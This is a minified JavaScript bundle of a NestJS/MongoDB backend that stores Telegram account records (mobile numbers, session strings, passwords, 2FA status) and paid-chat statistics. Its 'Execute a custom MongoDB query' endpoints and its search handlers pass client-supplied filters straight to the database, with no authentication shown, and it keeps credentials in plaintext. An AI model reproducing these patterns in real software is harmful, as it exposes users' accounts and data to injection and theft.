status"}),o("design:type",Boolean)],a.prototype,"demoGiven",void 0),n([(0,r.ApiProperty)({example:!1,description:"Second show status"}),o("design:type",Boolean)],a.prototype,"secondShow",void 0),n([(0,r.ApiProperty)({example:"sneha",description:"Profile name"}),o("design:type",String)],a.prototype,"profile",void 0),n([(0,r.ApiProperty)({example:!1,description:"Pics Sent status"}),o("design:type",Boolean)],a.prototype,"picsSent",void 0),n([(0,r.ApiProperty)({example:[],description:"videos"}),o("design:type",Array)],a.prototype,"videos",void 0)},2256:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchDto=void 0;const r=i(9742),a=i(4922);class s{}t.SearchDto=s,n([(0,r.ApiPropertyOptional)({description:"Total count",type:Number}),o("design:type",Number)],s.prototype,"totalCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Picture count",type:Number}),o("design:type",Number)],s.prototype,"picCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Last message timestamp",type:Number}),o("design:type",Number)],s.prototype,"lastMsgTimeStamp",void 0),n([(0,r.ApiPropertyOptional)({description:"Limit time",type:Number}),o("design:type",Number)],s.prototype,"limitTime",void 0),n([(0,r.ApiPropertyOptional)({description:"Paid count",type:Number}),o("design:type",Number)],s.prototype,"paidCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Profile count",type:Number}),o("design:type",Number)],s.prototype,"prfCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Can reply",type:Number}),o("design:type",Number)],s.prototype,"canReply",void 0),n([(0,r.ApiPropertyOptional)({description:"Pay amount",type:Number}),o("design:type",Number)],s.prototype,"payAmount",void 0),n([(0,r.ApiPropertyOptional)({description:"Username"}),o("design:type",String)],s.prototype,"username",void 0),n([(0,r.ApiPropertyOptional)({description:"Access hash"}),o("design:type",String)],s.prototype,"accessHash",void 0),n([(0,r.ApiPropertyOptional)({description:"Paid reply status",type:Boolean}),o("design:type",Boolean)],s.prototype,"paidReply",void 0),n([(0,r.ApiPropertyOptional)({description:"Demo given status",type:Boolean}),o("design:type",Boolean)],s.prototype,"demoGiven",void 0),n([(0,r.ApiPropertyOptional)({description:"Second show status",type:Boolean}),o("design:type",Boolean)],s.prototype,"secondShow",void 0),n([(0,r.ApiPropertyOptional)({description:"Profile name"}),(0,a.Transform)((({value:e})=>e?.trim().toLowerCase())),o("design:type",String)],s.prototype,"profile",void 0),n([(0,r.ApiPropertyOptional)({description:"Chat ID"}),o("design:type",String)],s.prototype,"chatId",void 0),n([(0,r.ApiPropertyOptional)({description:"Pics Sent status"}),o("design:type",Boolean)],s.prototype,"picsSent",void 0)},4241:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateUserDataDto=void 0;const n=i(9742),o=i(2932);class r extends((0,n.PartialType)(o.CreateUserDataDto)){}t.UpdateUserDataDto=r},3664:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataSchema=t.UserData=void 0;const r=i(5839);let a=class{};t.UserData=a,n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"chatId",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"totalCount",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"picCount",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"lastMsgTimeStamp",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"limitTime",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"paidCount",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"prfCount",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"canReply",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"payAmount",void 0),n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"username",void 0),n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"accessHash",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Boolean)],a.prototype,"paidReply",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Boolean)],a.prototype,"demoGiven",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Boolean)],a.prototype,"secondShow",void 0),n([(0,r.Prop)({required:!0,default:0}),o("design:type",Number)],a.prototype,"fullShow",void 0),n([(0,r.Prop)({required:!0}),o("design:type",String)],a.prototype,"profile",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Boolean)],a.prototype,"picSent",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"highestPayAmount",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"cheatCount",void 0),n([(0,r.Prop)({required:!0}),o("design:type",Number)],a.prototype,"callTime",void 0),n([(0,r.Prop)({required:!1,default:[]}),o("design:type",Array)],a.prototype,"videos",void 0),t.UserData=a=n([(0,r.Schema)({collection:"userData",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.UserDataSchema=r.SchemaFactory.createForClass(a)},430:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataController=void 0;const a=i(3563),s=i(9742),c=i(3559),l=i(2932),p=i(2256),d=i(4241);let u=class{constructor(e){this.userDataService=e}async create(e){return this.userDataService.create(e)}async search(e){return this.userDataService.search(e)}async findAll(){return this.userDataService.findAll()}async updateAll(e,t){return this.userDataService.updateAll(e,t)}async findOne(e,t){return this.userDataService.findOne(e,t)}async update(e,t,i){return this.userDataService.update(e,t,i)}async remove(e,t){return this.userDataService.remove(e,t)}clearCount(e){return this.userDataService.clearCount(e)}async executeQuery(e){try{const{query:t,sort:i,limit:n,skip:o}=e;return await this.userDataService.executeQuery(t,i,n,o)}catch(e){throw e}}};t.UserDataController=u,n([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[l.CreateUserDataDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),(0,s.ApiQuery)({name:"profile",required:!1,description:"User profile"}),(0,s.ApiQuery)({name:"chatId",required:!1,description:"Chat ID"}),(0,s.ApiQuery)({name:"isTesting",required:!1,type:Boolean}),(0,s.ApiQuery)({name:"banned",required:!1,type:Boolean}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[p.SearchDto]),o("design:returntype",Promise)],u.prototype,"search",null),n([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Patch)("updateAll/:chatId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("chatId")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,d.UpdateUserDataDto]),o("design:returntype",Promise)],u.prototype,"updateAll",null),n([(0,a.Get)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("profile")),r(1,(0,a.Param)("chatId")),o("design:type",Function),o("design:paramtypes",[String,String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Patch)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("profile")),r(1,(0,a.Param)("chatId")),r(2,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,String,d.UpdateUserDataDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Delete)(":profile/:chatId"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),r(0,(0,a.Param)("profile")),r(1,(0,a.Param)("chatId")),o("design:type",Function),o("design:paramtypes",[String,String]),o("design:returntype",Promise)],u.prototype,"remove",null),n([(0,a.Get)("clear-count"),r(0,(0,a.Query)("chatId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",void 0)],u.prototype,"clearCount",null),n([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"executeQuery",null),t.UserDataController=u=n([(0,s.ApiTags)("UserData of TG clients"),(0,a.Controller)("userData"),o("design:paramtypes",[c.UserDataService])],u)},6158:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataModule=void 0;const o=i(3563),r=i(5839),a=i(3664),s=i(3559),c=i(430),l=i(5774);let p=class{};t.UserDataModule=p,t.UserDataModule=p=n([(0,o.Module)({imports:[l.initModule,r.MongooseModule.forFeature([{name:a.UserData.name,schema:a.UserDataSchema,collection:"userData"}])],controllers:[c.UserDataController],providers:[s.UserDataService],exports:[s.UserDataService]})],p)},3559:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UserDataService=void 0;const a=i(3563),s=i(5839),c=i(6037),l=i(3664),p=i(3235);let d=class{constructor(e){this.userDataModel=e,this.callCounts=new Map}async create(e){return new this.userDataModel(e).save()}async findAll(){return await this.userDataModel.find().exec()}async findOne(e,t){const i=(await this.userDataModel.findOne({profile:e,chatId:t}).exec())?.toJSON();i||console.warn(`UserData with ID "${e} - ${t}" not found`);const n=this.callCounts.get(t)||0;return this.callCounts.set(t,n+1),i?{...i,count:this.callCounts.get(t)}:void 0}clearCount(e){return e?(this.callCounts.delete(e),`Count cleared for chatId: ${e}`):(this.callCounts.clear(),"All counts cleared.")}async update(e,t,i){delete i._id,console.log(i);const n=await this.userDataModel.findOneAndUpdate({profile:e,chatId:t},{$set:i},{new:!0,upsert:!0}).exec();return n||console.warn(`UserData with ID "${t}" not found`),n}async updateAll(e,t){delete t._id;const i=await this.userDataModel.updateMany({chatId:e},{$set:t},{new:!0,upsert:!0}).exec();return i||console.warn(`UserData with ID "${e}" not found`),i}async remove(e,t){const i=await this.userDataModel.findOneAndDelete({profile:e,chatId:t}).exec();return i||console.warn(`UserData with ID "${t}" not found`),i}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.userDataModel.find(e).exec()}async executeQuery(e,t,i,n){try{if(!e)throw new a.BadRequestException("Query is invalid.");const o=this.userDataModel.find(e);return t&&o.sort(t),i&&o.limit(i),n&&o.skip(n),await o.exec()}catch(e){throw new a.InternalServerErrorException(e.message)}}async resetPaidUsers(){try{await this.userDataModel.updateMany({$and:[{payAmount:{$gt:10},totalCount:{$gt:30}}]},{$set:{totalCount:10,limitTime:Date.now(),paidReply:!0}})}catch(e){(0,p.parseError)(e)}}};t.UserDataService=d,t.UserDataService=d=n([(0,a.Injectable)(),r(0,(0,s.InjectModel)(l.UserData.name)),o("design:paramtypes",[c.Model])],d)},9631:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreateUserDto=void 0;const r=i(9742);class a{constructor(){this.twoFA=!1,this.expired=!1,this.password=null,this.movieCount=0,this.photoCount=0,this.videoCount=0,this.otherPhotoCount=0,this.otherVideoCount=0,this.ownPhotoCount=0,this.ownVideoCount=0,this.contacts=0}}t.CreateUserDto=a,n([(0,r.ApiProperty)({description:"Mobile number of the user",example:"917330803480"}),o("design:type",String)],a.prototype,"mobile",void 0),n([(0,r.ApiProperty)({description:"Session information of the user",example:"string"}),o("design:type",String)],a.prototype,"session",void 0),n([(0,r.ApiProperty)({description:"First name of the user",example:"Praveen"}),o("design:type",String)],a.prototype,"firstName",void 0),n([(0,r.ApiProperty)({description:"Last name of the user",example:null}),o("design:type",String)],a.prototype,"lastName",void 0),n([(0,r.ApiProperty)({description:"Username of the user",example:null}),o("design:type",String)],a.prototype,"username",void 0),n([(0,r.ApiProperty)({description:"Number of channels",example:56}),o("design:type",Number)],a.prototype,"channels",void 0),n([(0,r.ApiProperty)({description:"Number of personal chats",example:74}),o("design:type",Number)],a.prototype,"personalChats",void 0),n([(0,r.ApiProperty)({description:"Number of messages",example:0}),o("design:type",Number)],a.prototype,"msgs",void 0),n([(0,r.ApiProperty)({description:"Total number of chats",example:195}),o("design:type",Number)],a.prototype,"totalChats",void 0),n([(0,r.ApiProperty)({description:"Timestamp of last active",example:"2024-06-03"}),o("design:type",String)],a.prototype,"lastActive",void 0),n([(0,r.ApiProperty)({description:"Telegram ID of the user",example:"2022068676"}),o("design:type",String)],a.prototype,"tgId",void 0),n([(0,r.ApiProperty)({description:"TwoFA status",example:!1}),o("design:type",Boolean)],a.prototype,"twoFA",void 0),n([(0,r.ApiProperty)({description:"Expiration status",example:!1}),o("design:type",Boolean)],a.prototype,"expired",void 0),n([(0,r.ApiProperty)({description:"password",example:"pass"}),o("design:type",String)],a.prototype,"password",void 0),n([(0,r.ApiProperty)({description:"Number of movies",example:0}),o("design:type",Number)],a.prototype,"movieCount",void 0),n([(0,r.ApiProperty)({description:"Number of photos",example:0}),o("design:type",Number)],a.prototype,"photoCount",void 0),n([(0,r.ApiProperty)({description:"Number of videos",example:0}),o("design:type",Number)],a.prototype,"videoCount",void 0),n([(0,r.ApiProperty)({description:"Gender of the user",example:null}),o("design:type",String)],a.prototype,"gender",void 0),n([(0,r.ApiProperty)({description:"Number of other photos",example:0}),o("design:type",Number)],a.prototype,"otherPhotoCount",void 0),n([(0,r.ApiProperty)({description:"Number of other videos",example:0}),o("design:type",Number)],a.prototype,"otherVideoCount",void 0),n([(0,r.ApiProperty)({description:"Number of own photos",example:0}),o("design:type",Number)],a.prototype,"ownPhotoCount",void 0),n([(0,r.ApiProperty)({description:"Number of own videos",example:0}),o("design:type",Number)],a.prototype,"ownVideoCount",void 0),n([(0,r.ApiProperty)({description:"Number of contacts",example:105}),o("design:type",Number)],a.prototype,"contacts",void 0),n([(0,r.ApiProperty)({description:"Call details of the user",example:{outgoing:1,incoming:0,video:1,chatCallCounts:[],totalCalls:1}}),o("design:type",Object)],a.prototype,"calls",void 0),n([(0,r.ApiPropertyOptional)({description:"Call details of the user",example:[]}),o("design:type",Array)],a.prototype,"recentUsers",void 0)},9879:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchUserDto=void 0;const r=i(9742),a=i(4922),s=i(7403);class c{}t.SearchUserDto=c,n([(0,r.ApiPropertyOptional)({description:"Filter by Telegram ID"}),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"tgId",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by mobile number"}),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"mobile",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by twoFA status",type:Boolean}),(0,s.IsOptional)(),(0,s.IsBoolean)(),o("design:type",Boolean)],c.prototype,"twoFA",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by Expiration status",type:Boolean}),(0,s.IsOptional)(),(0,s.IsBoolean)(),o("design:type",Boolean)],c.prototype,"expired",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by session"}),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"session",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by first name"}),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"firstName",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by last name"}),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"lastName",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by username"}),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"username",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by channels count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"channels",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by personal chats count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"personalChats",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by demo given status",type:Boolean}),(0,a.Transform)((({value:e})=>"true"===e||!0===e)),(0,s.IsOptional)(),(0,s.IsBoolean)(),o("design:type",Boolean)],c.prototype,"demoGiven",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by messages count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"msgs",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by total chats count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"totalChats",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by last active timestamp"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",String)],c.prototype,"lastActive",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by movie count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"movieCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"photoCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"videoCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by gender"}),(0,s.IsOptional)(),(0,s.IsString)(),o("design:type",String)],c.prototype,"gender",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by other photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"otherPhotoCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by other video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"otherVideoCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by own photo count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"ownPhotoCount",void 0),n([(0,r.ApiPropertyOptional)({description:"Filter by own video count"}),(0,s.IsOptional)(),(0,s.IsNumber)(),o("design:type",Number)],c.prototype,"ownVideoCount",void 0)},9732:(e,t,i)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdateUserDto=void 0;const n=i(8073),o=i(9631);class r extends((0,n.PartialType)(o.CreateUserDto)){}t.UpdateUserDto=r},6093:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__importDefault||function(e){return e&&e.__esModule?e:{default:e}};Object.defineProperty(t,"__esModule",{value:!0}),t.UserSchema=t.User=void 0;const a=i(5839),s=r(i(6037)),c=i(9742);let l=class{constructor(){this.twoFA=!1,this.expired=!1,this.password=null}};t.User=l,n([(0,c.ApiProperty)(),(0,a.Prop)({required:!0,unique:!0}),o("design:type",String)],l.prototype,"mobile",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)({required:!0,unique:!0}),o("design:type",String)],l.prototype,"session",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",String)],l.prototype,"firstName",void 0),n([(0,c.ApiProperty)({required:!1}),(0,a.Prop)(),o("design:type",String)],l.prototype,"lastName",void 0),n([(0,c.ApiProperty)({required:!1}),(0,a.Prop)(),o("design:type",String)],l.prototype,"username",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"channels",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"personalChats",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Boolean)],l.prototype,"demoGiven",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"msgs",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"totalChats",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",String)],l.prototype,"lastActive",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)({required:!0,unique:!0}),o("design:type",String)],l.prototype,"tgId",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"movieCount",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"photoCount",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"videoCount",void 0),n([(0,c.ApiProperty)({required:!1}),(0,a.Prop)(),o("design:type",String)],l.prototype,"gender",void 0),n([(0,a.Prop)({required:!1,type:Boolean}),o("design:type",Boolean)],l.prototype,"twoFA",void 0),n([(0,a.Prop)({required:!1,type:Boolean,default:!1}),o("design:type",Boolean)],l.prototype,"expired",void 0),n([(0,a.Prop)({required:!1}),o("design:type",String)],l.prototype,"password",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"otherPhotoCount",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"otherVideoCount",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"ownPhotoCount",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"ownVideoCount",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)(),o("design:type",Number)],l.prototype,"contacts",void 0),n([(0,c.ApiProperty)(),(0,a.Prop)({type:s.default.Schema.Types.Mixed,default:{outgoing:0,incoming:0,video:0,chatCallCounts:[],totalCalls:0}}),o("design:type",Object)],l.prototype,"calls",void 0),n([(0,c.ApiPropertyOptional)(),(0,a.Prop)({type:s.default.Schema.Types.Mixed,default:[],required:!1}),o("design:type",Array)],l.prototype,"recentUsers",void 0),t.User=l=n([(0,a.Schema)({collection:"users",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],l),t.UserSchema=a.SchemaFactory.createForClass(l)},8622:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a},o=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(i,n){t(i,n,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersController=void 0;const a=i(3563),s=i(9127),c=i(9742),l=i(9879),p=i(9732),d=i(9631);let u=class{constructor(e){this.usersService=e}async create(e){return console.log("creating new user"),this.usersService.create(e)}async search(e){return this.usersService.search(e)}async findAll(){return this.usersService.findAll()}async findOne(e){return this.usersService.findOne(e)}async update(e,t){return this.usersService.update(e,t)}async remove(e){return this.usersService.delete(e)}async executeQuery(e){const{query:t,sort:i,limit:n,skip:o}=e;try{return await this.usersService.executeQuery(t,i,n,o)}catch(e){throw e}}};t.UsersController=u,n([(0,a.Post)(),(0,c.ApiOperation)({summary:"Create a new user"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[d.CreateUserDto]),o("design:returntype",Promise)],u.prototype,"create",null),n([(0,a.Get)("/search"),(0,c.ApiOperation)({summary:"Search users based on various parameters"}),r(0,(0,a.Query)()),o("design:type",Function),o("design:paramtypes",[l.SearchUserDto]),o("design:returntype",Promise)],u.prototype,"search",null),n([(0,a.Get)(),(0,c.ApiOperation)({summary:"Get all users"}),o("design:type",Function),o("design:paramtypes",[]),o("design:returntype",Promise)],u.prototype,"findAll",null),n([(0,a.Get)(":tgId"),(0,c.ApiOperation)({summary:"Get a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),r(0,(0,a.Param)("tgId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"findOne",null),n([(0,a.Patch)(":tgId"),(0,c.ApiOperation)({summary:"Update a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),r(0,(0,a.Param)("tgId")),r(1,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[String,p.UpdateUserDto]),o("design:returntype",Promise)],u.prototype,"update",null),n([(0,a.Delete)(":tgId"),(0,c.ApiOperation)({summary:"Delete a user by tgId"}),(0,c.ApiParam)({name:"tgId",description:"The Telegram ID of the user",type:String}),r(0,(0,a.Param)("tgId")),o("design:type",Function),o("design:paramtypes",[String]),o("design:returntype",Promise)],u.prototype,"remove",null),n([(0,a.Post)("query"),(0,c.ApiOperation)({summary:"Execute a custom MongoDB query"}),r(0,(0,a.Body)()),o("design:type",Function),o("design:paramtypes",[Object]),o("design:returntype",Promise)],u.prototype,"executeQuery",null),t.UsersController=u=n([(0,c.ApiTags)("Telegram Users"),(0,a.Controller)("user"),o("design:paramtypes",[s.UsersService])],u)},7422:function(e,t,i){var n=this&&this.__decorate||function(e,t,i,n){var o,r=arguments.length,a=r<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,i):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,i,n);else for(var s=e.length-1;s>=0;s--)(o=e[s])&&(a=(r<3?o(a):r>3?o(t,i,a):o(t,i))||a);return r>3&&a&&Object.defineProperty(t,i,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.UsersModule=void 0;const o=i(3563),r=i(5839),a=i(9127),s=i(8622),c=i(6093),l=i(282),p=i(8009),d=i(5774);let 